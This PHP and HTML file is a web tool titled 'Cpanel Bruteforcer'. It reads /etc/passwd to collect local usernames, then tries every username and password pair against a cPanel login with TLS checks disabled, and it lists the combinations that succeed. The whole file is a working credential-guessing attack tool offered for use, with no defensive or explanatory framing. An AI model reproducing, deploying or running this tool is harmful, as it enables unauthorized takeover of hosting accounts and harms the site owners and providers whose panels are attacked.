<?php


function CPCracker($user, $pass, $protocol = 'http', $server = 'localhost', $port = '2083')
{
    $url = "$protocol://$server:$port";
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array("Authorization: Basic " . base64_encode($user . ":" . $pass) . "\n\r"));
    curl_setopt($curl, CURLOPT_URL, $url);
    $result = @curl_exec($curl);
    $curl_errno = curl_errno($curl);
    $curl_error = curl_error($curl);
    if ($curl_errno > 0) {
        $response = ['status' => 'error', 'message' => "$curl_error"];
        return json_encode($response);
    } elseif (preg_match('/filemanager/i', $result)) {
        $response = ['status' => 'success', 'message' => "$protocol://$server:$port = $user:$pass"];
        return json_encode($response);
    }
    $response = ['status' => 'fail', 'message' => "$protocol://$server:$port = $user:$pass"];
    return json_encode($response);
    curl_close($curl);
}

function getUsersFromPasswdFile($passwdFilePath = '/etc/passwd')
{
    $usernames = [];
    if (!file_exists($passwdFilePath) || !is_readable($passwdFilePath)) {
        return $usernames;
    }
    $passwdContent = file_get_contents($passwdFilePath);

    $lines = explode("\n", $passwdContent);
    foreach ($lines as $line) {
        $fields = explode(":", $line);
        $username = $fields[0];
        if (!empty($username)) {
            $usernames[] = $username;
        }
    }

    return $usernames;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents("php://input"));
    $protocol = $data->protocol;
    $server = $data->server;
    $port = $data->port;
    $username = $data->username;
    $password = $data->password;
    die(CPCracker($username, $password, $protocol, $server, $port));
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cpanel Bruteforcer</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.10.2/dist/sweetalert2.min.css">
    <style>
        .d-ilang {
            opacity: 0%;
        }

        .d-kintil {
            border: none;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="row">
            <div class="col-md-12 mb-3">
                <div class="card mt-5">
                    <div class="card-body">
                        <h5 class="mb-5 text-center">Cpanel Bruteforcer</h5>
                        <form id="loginForm">
                            <div class="row">
                                <div class="col-md-6 mb-3">
                                    <label class="form-label">Username</label>
                                    <textarea class="form-control" id="username" name="username" rows="8"><?= implode("\n", getUsersFromPasswdFile()); ?></textarea>
                                </div>
                                <div class="col-md-6 mb-3">
                                    <label class="form-label">Password</label>
                                    <textarea class="form-control" id="password" name="password" rows="8"></textarea>
                                </div>
                                <div class="col-md-2 mb-3">
                                    <label class="form-label">Protocol</label>
                                    <select name="protocol" id="protocol" class="form-control">
                                        <option value="https">https</option>
                                        <option value="http">http</option>
                                    </select>
                                </div>
                                <div class="col-md-1 mb-3 text-center">
                                    <label class="form-label d-ilang">A</label>
                                    <span class="form-control d-kintil">: / /</span>
                                </div>
                                <div class="col-md-6 mb-3">
                                    <label class="form-label">Server</label>
                                    <input class="form-control" type="text" name="server" id="server" value="localhost">
                                </div>
                                <div class="col-md-1 mb-3 text-center">
                                    <label class="form-label d-ilang">A</label>
                                    <span class="form-control d-kintil">:</span>
                                </div>
                                <div class="col-md-2 mb-3">
                                    <label class="form-label">Port</label>
                                    <input class="form-control" type="number" name="port" id="port" value="2083">
                                </div>
                            </div>
                            <button class="btn btn-primary" type="button" onclick="submitForm()" id="tombolSubmit">Submit</button>
                        </form>
                    </div>
                </div>
            </div>
            <div id="results" class="d-none">
                <div class="col-md-12">
                    <div class="accordion" id="accordionPanelsStayOpenExample">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="panelsStayOpen-headingOne">
                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#panelsStayOpen-collapseOne" aria-expanded="true" aria-controls="panelsStayOpen-collapseOne">
                                    <span>Success <span class="badge bg-success" id="successCount">0</span></span>
                                </button>
                            </h2>
                            <div id="panelsStayOpen-collapseOne" class="accordion-collapse collapse show" aria-labelledby="panelsStayOpen-headingOne">
                                <div class="accordion-body" id="successBody">

                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="panelsStayOpen-headingTwo">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#panelsStayOpen-collapseTwo" aria-expanded="false" aria-controls="panelsStayOpen-collapseTwo">
                                    <span>Fail <span class="badge bg-danger" id="failCount">0</span></span>
                                </button>
                            </h2>
                            <div id="panelsStayOpen-collapseTwo" class="accordion-collapse collapse" aria-labelledby="panelsStayOpen-headingTwo">
                                <div class="accordion-body" id="failBody">

                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="panelsStayOpen-headingThree">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#panelsStayOpen-collapseThree" aria-expanded="false" aria-controls="panelsStayOpen-collapseThree">
                                    <span>Error <span class="badge bg-warning" id="errorCount">0</span></span>
                                </button>
                            </h2>
                            <div id="panelsStayOpen-collapseThree" class="accordion-collapse collapse" aria-labelledby="panelsStayOpen-headingThree">
                                <div class="accordion-body" id="errorBody">

                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.10.2/dist/sweetalert2.all.min.js"></script>
    <script>
        function tambahSuccess(msg) {
            var counter = document.getElementById('successCount').innerText
            var body = document.getElementById('successBody')
            counter = parseInt(counter) + 1;
            document.getElementById('successCount').innerText = counter
            body.insertAdjacentHTML('beforeend', '<font color="#198754"><strong>Berhasil!</strong></font> | ' + msg + '<br>');
        }

        function tambahFail(msg) {
            var counter = document.getElementById('failCount').innerText
            var body = document.getElementById('failBody')
            counter = parseInt(counter) + 1;
            document.getElementById('failCount').innerText = counter
            body.insertAdjacentHTML('beforeend', '<font color="#dc3545"><strong>Gagal!</strong></font> | ' + msg + '<br>');
        }

        function tambahError(msg) {
            var counter = document.getElementById('errorCount').innerText
            var body = document.getElementById('errorBody')
            counter = parseInt(counter) + 1;
            document.getElementById('errorCount').innerText = counter
            body.insertAdjacentHTML('beforeend', '<font color="#ffc107"><strong>Error!</strong></font> | ' + msg + '<br>');
        }

        function removeDuplicatesAndEmptyLines(arr) {
            var uniqueArray = Array.from(new Set(arr));
            var nonEmptyArray = uniqueArray.filter(line => line.trim() !== '');
            return nonEmptyArray;
        }

        function submitForm() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var protocol = document.getElementById('protocol').value;
            var server = document.getElementById('server').value;
            var port = document.getElementById('port').value;

            if (username.trim() === '' || password.trim() === '' || protocol.trim() === '' || server.trim() === '' || port.trim() === '') {
                Swal.fire({
                    title: 'Error!',
                    text: 'All fields must be filled!',
                    icon: 'warning'
                })
                return;
            }

            var users = username.split("\n");
            var pwd = password.split("\n");

            users = removeDuplicatesAndEmptyLines(users);
            pwd = removeDuplicatesAndEmptyLines(pwd);
            document.getElementById('username').value = users.join("\n");
            document.getElementById('password').value = pwd.join("\n");

            document.getElementById('username').readOnly = true;
            document.getElementById('password').readOnly = true;
            document.getElementById('protocol').disabled = true;
            document.getElementById('server').readOnly = true;
            document.getElementById('port').readOnly = true;
            document.getElementById('tombolSubmit').disabled = true;
            document.getElementById('results').classList.remove('d-none');
            sendXHRRequests(users, pwd, protocol, server, port, allRequestsCompleted);
        }

        function sendXHRRequests(users, pwd, protocol, server, port, callback) {
            var delayBetweenRequests = 1000;
            var totalRequests = users.length * pwd.length;
            var requestsCounter = 0;

            function sendRequest(i, j) {
                var xhr = new XMLHttpRequest();

                xhr.open('POST', window.location.href, true);
                xhr.setRequestHeader('Content-Type', 'application/json');

                xhr.onload = function() {
                    if (xhr.status === 200) {
                        var response = JSON.parse(xhr.responseText);
                        handleResponse(response);

                        requestsCounter++;
                        var percentage = (requestsCounter / totalRequests) * 100;
                        document.title = percentage.toFixed(2) + '% | Cpanel Bruteforcer';

                        if (requestsCounter === totalRequests) {
                            callback();
                        } else {
                            setTimeout(function() {
                                sendNextRequest(i, j);
                            }, delayBetweenRequests);
                        }
                    }
                };

                xhr.onerror = function() {
                    requestsCounter++;

                    if (requestsCounter === totalRequests) {
                        callback();
                    } else {
                        setTimeout(function() {
                            sendNextRequest(i, j);
                        }, delayBetweenRequests);
                    }
                };

                var data = JSON.stringify({
                    protocol: protocol,
                    server: server,
                    port: port,
                    username: users[i],
                    password: pwd[j]
                });

                xhr.send(data);
            }

            function sendNextRequest(i, j) {
                if (j + 1 < pwd.length) {
                    sendRequest(i, j + 1);
                } else {
                    if (i + 1 < users.length) {
                        sendRequest(i + 1, 0);
                    }
                }
            }

            sendRequest(0, 0);
        }

        function handleResponse(response) {
            switch (response.status) {
                case 'success':
                    tambahSuccess(response.message);
                    break;
                case 'error':
                    tambahError(response.message);
                    break;
                default:
                    tambahFail(response.message);
                    break;
            }
        }

        function allRequestsCompleted() {
            document.getElementById('username').readOnly = false;
            document.getElementById('password').readOnly = false;
            document.getElementById('protocol').disabled = false;
            document.getElementById('server').readOnly = false;
            document.getElementById('port').readOnly = false;
            document.getElementById('tombolSubmit').disabled = false;
            Swal.fire({
                title: 'Completed!',
                text: 'All process is completed!',
                icon: 'success'
            });
        }
    </script>
</body>

</html>